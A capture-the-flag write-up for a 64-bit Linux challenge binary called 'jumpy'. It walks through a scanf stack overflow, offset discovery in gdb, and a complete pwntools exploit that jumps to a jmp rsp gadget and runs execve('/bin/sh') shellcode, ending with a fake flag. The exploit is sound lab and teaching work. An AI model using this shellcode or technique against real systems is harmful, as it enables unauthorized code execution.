# jumpy

Let's open the binary in IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4[6]; // [rsp+0h] [rbp-30h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("Jump, jump, jump... where are we going today?\n");
  memset(v4, 0, 40);
  __isoc99_scanf("%s", v4);
  return 0;
}
```

We can see the `scanf` vulnerable function, so it's easy to overflow it

```c
np proc near
endbr64
jmp     rsp
np endp
```

We also see a `jmp rsp` which hints at executing shellcode. Let's `checksec`:

```c
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

NX is disabled, so we can just execute code from the stack. Let's find the offset:

```c
Starting program: /home/toma/tfc/jumpy/jumpy 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Jump, jump, jump... where are we going today?

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x0 
RDX: 0x1 
RSI: 0xa ('\n')
RDI: 0x7fffffffde30 --> 0x19dfe69 
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffe3a8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x401201 (<main+130>:	ret)
R8 : 0x0 
R9 : 0x7ffff7fd9d00 (<_dl_fini>:	endbr64)
R10: 0x0 
R11: 0x0 
R12: 0x7fffffffe4c8 --> 0x7fffffffe72b ("/home/toma/tfc/jumpy/jumpy")
R13: 0x40117f (<main>:	endbr64)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d1300000000
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011f6 <main+119>:	call   0x401080 <__isoc99_scanf@plt>
   0x4011fb <main+124>:	mov    eax,0x0
   0x401200 <main+129>:	leave  
=> 0x401201 <main+130>:	ret    
   0x401202:	add    BYTE PTR [rax],al
   0x401204 <_fini>:	endbr64 
   0x401208 <_fini+4>:	sub    rsp,0x8
   0x40120c <_fini+8>:	add    rsp,0x8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3a8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffe3b0 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffe3b8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffe3c0 ("AJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffe3c8 ("AAKAAgAA6AAL")
0040| 0x7fffffffe3d0 --> 0x4c414136 ('6AAL')
0048| 0x7fffffffe3d8 --> 0x2eb0c7cf679efb6a 
0056| 0x7fffffffe3e0 --> 0x7fffffffe4c8 --> 0x7fffffffe72b ("/home/toma/tfc/jumpy/jumpy")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401201 in main ()
gdb-peda$ pattern offset AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 56
gdb-peda$
```

So we just need to jump to the `jmp rsp` instruction to execute the shellcode placed on the stack:

```python
from pwn import *

context.log_level = 'debug'

elf = ELF("./jumpy")

r = process(["./jumpy"])

r.clean()
shellcode = asm("""
    mov rax, 59
    mov rbx, 0
    push rbx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    syscall
""", arch='amd64')
r.sendline(b"A" * 56 + p64(elf.sym['np']) + shellcode)
r.sendline(b"cat flag")
flag = r.recvuntil(b"}")
log.success(f"{flag=}")
```

```bash
[*] '/home/toma/tfc/jumpy/jumpy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process './jumpy': pid 2131
[DEBUG] Received 0x2f bytes:
    b'Jump, jump, jump... where are we going today?\n'
    b'\n'
[DEBUG] cpp -C -nostdinc -undef -P -I/home/toma/.local/lib/python3.9/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
        mov rax, 59
        mov rbx, 0
        push rbx
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        xor rsi, rsi
        xor rdx, rdx
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-kx4wjor6/step2 /tmp/pwn-asm-kx4wjor6/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-kx4wjor6/step3 /tmp/pwn-asm-kx4wjor6/step4
[DEBUG] Sent 0x65 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  41 41 41 41  76 11 40 00  00 00 00 00  │AAAA│AAAA│v·@·│····│
    00000040  48 c7 c0 3b  00 00 00 48  c7 c3 00 00  00 00 53 48  │H··;│···H│····│··SH│
    00000050  bb 2f 62 69  6e 2f 2f 73  68 53 54 5f  48 31 f6 48  │·/bi│n//s│hST_│H1·H│
    00000060  31 d2 0f 05  0a                                     │1···│·│
    00000065
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0xb bytes:
    b'FLAG{fake}\n'
[+] flag=b'FLAG{fake}'
[*] Stopped process './jumpy' (pid 2131)
```